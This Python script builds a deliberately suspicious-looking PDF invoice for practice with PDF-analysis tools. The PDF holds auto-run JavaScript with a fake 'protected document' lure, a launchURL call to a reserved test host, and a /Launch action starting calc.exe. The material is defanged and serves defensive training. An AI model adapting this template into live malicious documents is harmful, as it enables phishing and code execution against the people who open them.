#!/usr/bin/env python3
# Build a benign-but-realistic malicious-looking PDF for tool training.
# Indicators the Didier Stevens tools will flag (all inert here):
#   /OpenAction + /JavaScript + /JS  -> script runs automatically on open
#   /AA (additional action) on the page -> a /Launch action
#   /Launch -> would start an external program (here: calc.exe, the classic demo)
#   /URI    -> an external link
# The JavaScript only pops app.alert and calls app.launchURL to a defanged,
# RFC-reserved host (example.test). Nothing weaponized. JS is stored compressed
# (FlateDecode) so the analyst must use `pdf-parser -f` to decode it.
import zlib, sys

JS = (b"// Acme Secure Reader bootstrap\n"
      b"app.alert({cMsg: \"This document is protected. Click OK to view it.\", "
      b"cTitle: \"Acme Secure Reader\", nIcon: 1});\n"
      b"var trackUrl = \"http://www.example.test/track?doc=INV-2024-0042\";\n"
      b"app.launchURL(trackUrl, true);\n")
js_stream = zlib.compress(JS)

objs = {}
objs[1] = (b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R "
           b"/Names << /JavaScript << /Names [ (AcmeBoot) 7 0 R ] >> >> >>")
objs[2] = b"<< /Type /Pages /Kids [ 3 0 R ] /Count 1 >>"
objs[3] = (b"<< /Type /Page /Parent 2 0 R /MediaBox [ 0 0 612 792 ] "
           b"/Resources << >> /Annots [ 9 0 R ] /AA << /O 8 0 R >> >>")
objs[4] = b"<< /Type /Action /S /JavaScript /JS 5 0 R >>"
objs[5] = (b"<< /Length " + str(len(js_stream)).encode() + b" /Filter /FlateDecode >>\n"
           b"stream\n" + js_stream + b"\nendstream")
objs[7] = (b"<< /Type /Action /S /JavaScript /JS "
           b"(app.alert\\(\"Loading Acme invoice viewer...\"\\);) >>")
objs[8] = (b"<< /Type /Action /S /Launch "
           b"/Win << /F (calc.exe) /D (C:\\\\Windows\\\\System32) /P () >> >>")
objs[9] = (b"<< /Type /Annot /Subtype /Link /Rect [ 72 700 540 720 ] "
           b"/Border [ 0 0 0 ] /A << /Type /Action /S /URI "
           b"/URI (http://www.example.test/invoice/INV-2024-0042) >> >>")

order = [1, 2, 3, 4, 5, 7, 8, 9]
out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")
offsets = {}
for n in order:
    offsets[n] = len(out)
    out += str(n).encode() + b" 0 obj\n" + objs[n] + b"\nendobj\n"

xref_pos = len(out)
maxobj = max(order)
out += b"xref\n0 " + str(maxobj + 1).encode() + b"\n"
out += b"0000000000 65535 f \n"
for n in range(1, maxobj + 1):
    if n in offsets:
        out += ("%010d 00000 n \n" % offsets[n]).encode()
    else:
        out += b"0000000000 65535 f \n"   # free entry for the unused object number
out += (b"trailer\n<< /Size " + str(maxobj + 1).encode() +
        b" /Root 1 0 R >>\nstartxref\n" + str(xref_pos).encode() + b"\n%%EOF\n")

path = sys.argv[1] if len(sys.argv) > 1 else "/tmp/otest/invoice.pdf"
open(path, "wb").write(out)
print("WROTE", path, len(out), "bytes; JS compressed", len(js_stream), "of", len(JS))
